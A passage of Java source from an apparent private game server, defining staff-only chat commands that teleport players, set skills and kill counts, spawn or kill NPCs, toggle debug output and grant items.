                new Command("ctele", new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", "z"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", "x"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", "y"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", "x"), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", "y")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int x = Integer.parseInt(input[1].trim()) << 6 | Integer.parseInt(input[3].trim());
                        int y = Integer.parseInt(input[2].trim()) << 6 | Integer.parseInt(input[4].trim());
                        int z = Integer.parseInt(input[0].trim());
                        player.setTeleportTarget(Position.create(x, y, z));
                        return true;
                    }
                },
                new Command("resetbork") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getPermExtraData().put(Bork.getTimeKey(), 0L);
                        return true;
                    }
                },
                new Command("triggerrandom", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        RandomEvent.triggerRandom(World.getPlayerByName(input[0].trim()), false);
                        return true;
                    }
                },
                new Command("chatdebug") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ChatPacketHandler.debug = !ChatPacketHandler.debug;
                        player.sendf("[Chat Debug]: %s.", ChatPacketHandler.debug ? "Enabled" : "Disabled");
                        return true;
                    }
                },
                new Command("setexp", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > -1 && integer < 25, "Integer", "Skill ID"), new CommandInput<Integer>(integer -> integer > -1 && integer < 200000001, "Integer", "Skill Experience")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int skill = Integer.parseInt(input[1].trim());
                        final int experience = Integer.parseInt(input[2].trim());
                        target.getSkills().setLevel(skill, player.getSkills().getLevelForExp(experience));
                        target.getSkills().setExperience(skill, experience);
                        return true;
                    }
                },
                new Command("finishclue") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final ClueScroll clue = ClueScrollManager.getInInventory(player);
                        if (clue != null) {
                            clue.apply(player);
                        }
                        return true;
                    }
                },
                new Command("wildyboss") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        if (WildernessBossTask.currentBoss != null) {
                            player.setTeleportTarget(WildernessBossTask.currentBoss.getPosition());
                        }
                        return true;
                    }
                },
                new Command("removeobject") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 0; array < 15; array++) {
                            player.getActionSender().sendDestroyObject(array, 0, player.getPosition());
                        }
                        return true;
                    }
                },
                new Command("removeobjects", new CommandInput<Integer>(integer -> integer > -1 && integer < Integer.MAX_VALUE, "Integer", "Object ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        final Position location = player.getPosition();
                        for (int x = location.getX() - id; x < location.getX() + id; x++) {
                            for (int y = location.getY() - id; y < location.getY() + id; y++) {
                                player.getActionSender().sendDestroyObject(id, 0, Position.create(x, y, location.getZ()));
                            }
                        }
                        return true;
                    }
                },
                new Command("saveall") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> {
                            PlayerSaving.save(target);
                            target.sendMessage("Account Saved");
                        });
                        return true;
                    }
                },
                new Command("emptysummnpcs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (final int array : SummoningMonsters.SUMMONING_MONSTERS) {
                            for (final NPC npc : World.getNpcs()) {
                                if (npc.getDefinition().getId() == array) {
                                    World.submit(new NpcDeathTask(npc));
                                    World.getNpcs().remove(npc);
                                }
                            }
                        }
                        return true;
                    }
                },
                new Command("turnbhon") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Map<String, Map.Entry<Boolean, Boolean>> map = new HashMap<>();
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> {
                            boolean old = target.getPermExtraData().getBoolean("bhon");
                            target.getPermExtraData().put("bhon", true);
                            boolean change = target.getPermExtraData().getBoolean("bhon");
                            map.put(target.getName(), new AbstractMap.SimpleEntry<Boolean, Boolean>(old, change));
                            target.sendf("Your bounty hunter has been set from @red@%s @bla@to @red@%s", old, change);
                        });
                        map.entrySet().stream().forEach(entry -> {
                            player.sendf("@blu@%s @red@%s@bla@->@red@%s", entry.getKey(), entry.getValue().getKey(), entry.getValue().getKey());
                        });
                        return true;
                    }
                },
                new Command("reloadrevs") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getNpcs().stream().forEach(npc -> {
                            npc.agressiveDis = NPCManager.getAgressiveDistance(npc.getDefinition().getId());
                        });
                        for (int array : RevAttack.getRevs()) {
                            final NPCDefinition definition = NPCDefinition.forId(array);
                            if (definition != null) {
                                definition.getDrops().clear();
                                for (final int drops : PvPArmourStorage.getArmours()) {
                                    definition.getDrops().add(NPCDrop.create(drops, 1, 1, definition.combat() / 10));
                                    definition.getDrops().add(NPCDrop.create(13889, 1, 1, definition.combat() / 30));
                                    definition.getDrops().add(NPCDrop.create(13895, 1, 1, definition.combat() / 50));
                                }
                            }
                        }
                        return true;
                    }
                },
                new Command("reloadaod") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int[] array = new int[10];
                        Arrays.fill(array, 350);
                        NPCDefinition.getDefinitions()[8596] = NPCDefinition.create(8596, 1200, 525, array, 11199, 11198, new int[]{11197}, 3, "Avatar of Destruction", 120);
                        return true;
                    }
                },
                new Command("imitatedeaths", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        for (int array = 0; array < 100; array++) {
                            final NPC npc = NPCManager.addNPC(player.getPosition(), id, -1);
                            npc.cE.hit(npc.health * 5, player, false, Constants.DEFLECT);
                        }
                        return true;
                    }
                },
                new Command("setkills", new CommandInput<Integer>(integer -> integer > -1 && integer < Integer.MAX_VALUE, "Integer", "Kill Amount")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.setKillCount(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new Command("howmanyinwild") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final List<Player> list = new ArrayList<>();
                        World.getPlayers().stream().filter(target -> target != null && Position.inAttackableArea(target)).forEach(target -> list.add(target));
                        player.sendf("%,d players in the wilderness.", list.size());
                        return true;
                    }
                },
                new Command("toggledebug") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.debug = !player.debug;
                        player.sendf("[Debug]: %s", player.debug ? "Enabled" : "Disabled");
                        return true;
                    }
                },
                new Command("resetpits") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        FightPits.playersInGame.stream().forEach(target -> FightPits.removePlayerFromGame(target, true));
                        FightPits.playersInGame.clear();
                        return true;
                    }
                },
                new Command("setminyell", new CommandInput<Integer>(integer -> Rank.forIndex(integer) != null, "Integer", "Rank Index")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        YellCommand.minYellRank = Integer.parseInt(input[0].trim());
                        return true;
                    }
                },
                new Command("setnpc", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player"), new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.setPNpc(Integer.parseInt(input[1].trim()));
                        return true;
                    }
                },
                new Command("closelistener") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getInterfaceState().resetContainers();
                        return true;
                    }
                },
                new Command("config", new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", String.format("Configuration ID", Integer.MIN_VALUE, Integer.MAX_VALUE)), new CommandInput<Integer>(integer -> integer > Integer.MIN_VALUE && integer < Integer.MAX_VALUE, "Integer", String.format("Configuration State", Integer.MIN_VALUE, Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int state = Integer.parseInt(input[1].trim());
                        player.getActionSender().sendClientConfig(id, state);
                        return true;
                    }
                },
                new Command("randomlocation") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.setTeleportTarget(Position.create(Combat.random(3000), Combat.random(3000), Combat.random(3)));
                        return true;
                    }
                },
                new Command("killallnpcs", new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getRegion().getNpcs().stream().filter(npc -> npc != null && npc.getDefinition().getId() == Integer.parseInt(input[0].trim())).forEach(npc -> {
                            npc.getCombat().hit(npc.health * 5, player, false, Constants.DEFLECT);
                            npc.setDead(true);
                            World.submit(new NpcDeathTask(npc));
                        });
                        return true;
                    }
                },
                new Command("teleotherclose", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.setTeleportTarget(player.getPosition().getCloseLocation());
                        return true;
                    }
                },
                new Command("testweapons") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        return true;
                    }
                },
                new Command("summoninginfo") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        NPC npc = player.getCombat().getFamiliar();
                        if (npc != null) {
                            player.sendf("[Name]: %s", NPCDefinition.getDefinitions()[npc.getDefinition().getId()].getName());
                            Entity interaction = npc.getInteractingEntity();
                            if (interaction instanceof Player) {
                                Player target = (Player) interaction;
                                player.sendf("[Player Interaction]: %s", TextUtils.optimizeText(target.getName()));
                            } else if (interaction instanceof NPC) {
                                NPC opponent = (NPC) interaction;
                                player.sendf("[NPC Interaction]: %s", NPCDefinition.getDefinitions()[opponent.getDefinition().getId()].getName());
                            } else {
                                player.sendMessage("Familiar not interacting any entities.");
                            }
                            player.sendf("[Index]: %d", npc.getIndex());
                            Entity opponent = npc.getCombat().getOpponent().getEntity();
                            if (opponent instanceof Player) {
                                Player target = (Player) opponent;
                                player.sendf("[Player Combat]: %s", TextUtils.optimizeText(target.getName()));
                            } else if (opponent instanceof NPC) {
                                NPC other = (NPC) opponent;
                                player.sendf("[NPC Combat]: %s", NPCDefinition.getDefinitions()[other.getDefinition().getId()].getName());
                            } else {
                                player.sendMessage("Familiar not in combat with anything.");
                            }
                            Combat.follow(npc.cE, player.cE);
                        } else {
                            player.sendMessage("No familiar present.");
                        }
                        return true;
                    }
                },
                new Command("anim", new CommandInput<Integer>(integer -> integer > -2 && integer < Integer.MAX_VALUE, "Integer", "Animation ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", "Animation Delay")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.playAnimation(Animation.create(Integer.parseInt(input[0].trim()), Integer.parseInt(input[1].trim())));
                        return true;
                    }
                },
                new Command("repeatanim", new CommandInput<Integer>(integer -> integer > -2 && integer < Integer.MAX_VALUE, "Integer", "Animation ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", "Animation Delay")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        final int delay = Integer.parseInt(input[1].trim());
                        World.submit(new Task(800, "repeat anim") {
                            @Override
                            public void execute() {
                                if (player == null) {
                                    stop();
                                }
                                player.playAnimation(Animation.create(id, delay));
                            }
                        });
                        return true;
                    }
                },
                new Command("settaskamount", new CommandInput<Integer>(integer -> integer > -1 && integer < Integer.MAX_VALUE, "Integer", "Task Amount")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.setPvPTaskAmount(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new Command("listsupers") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> (target != null) && (Rank.getPrimaryRank(target).ordinal() == Rank.SUPER_DONATOR.ordinal())).forEach(target -> player.sendf(target.getName()));
                        return true;
                    }
                },
                new Command("summoningspec") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        SummoningSpecial.preformSpecial(player, SummoningSpecial.getCorrectSpecial(player.getCombat().getFamiliar().getDefinition().getId()));
                        return true;
                    }
                },
                new Command("masterme") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 0; array < 24; array++) {
                            player.getSkills().setLevel(array, 99);
                            player.getSkills().setExperience(array, Skills.getXPForLevel(99));
                        }
                        return true;
                    }
                },
                new Command("unmasterme") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 10; array <= 21; array++) {
                            player.getSkills().setLevel(array, 1);
                            player.getSkills().setExperience(array, 0);
                        }
                        return true;
                    }
                },
                new Command("repeatgfx", new CommandInput<Integer>(integer -> integer > -2 && integer < Integer.MAX_VALUE, "Integer", "Animation ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Integer", "Animation Delay")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        final int delay = Integer.parseInt(input[1].trim());
                        World.submit(new Task(800, "repeat gfx") {
                            @Override
                            public void execute() {
                                if (player == null) {
                                    stop();
                                }
                                player.playGraphics(Graphic.create(id, delay));
                            }
                        });
                        return true;
                    }
                },
                new Command("sendstrings") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        for (int array = 0; array < 50000; array++) {
                            try {
                                player.getActionSender().sendString(array, String.format("%,d", array));
                            } catch (Throwable thrown) {
                                player.sendf("Skipped %,d", array);
                            }
                        }
                        return true;
                    }
                },
                new Command("interface", new CommandInput<Integer>(integer -> integer > -2 && integer < Integer.MAX_VALUE, "Integer", "Interface ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getActionSender().showInterface(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new Command("spamnpc", new CommandInput<String>(string -> string != null, "String", "Message to Spam")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final String value = input[0].trim();
                        World.getNpcs().stream().forEach(npc -> npc.forceMessage(value));
                        return true;
                    }
                },
                new Command("clearinv") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        DialogueManager.openDialogue(player, 143);
                        return true;
                    }
                },
                new Command("givewikireward", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final Item item = Item.create(17650, 1);//17650, 1
                        if (!target.getInventory().add(item)) {
                            target.getBank().add(item);
                        } else {
                            target.getInventory().add(item);
                        }
                        player.sendMessage("You receive a reward for being part of the ArteroPk wiki!");
                        return true;
                    }
                },
                new Command("god") {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        Arrays.asList(Skills.HITPOINTS, Skills.PRAYER, Skills.SUMMONING).forEach(value -> player.getSkills().setLevel(value, Integer.MAX_VALUE));
                        Arrays.asList(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11).forEach(value -> player.getBonus().set(value, 25000));
                        return true;
                    }
                }
        );
    }
    //</editor-fold>
}
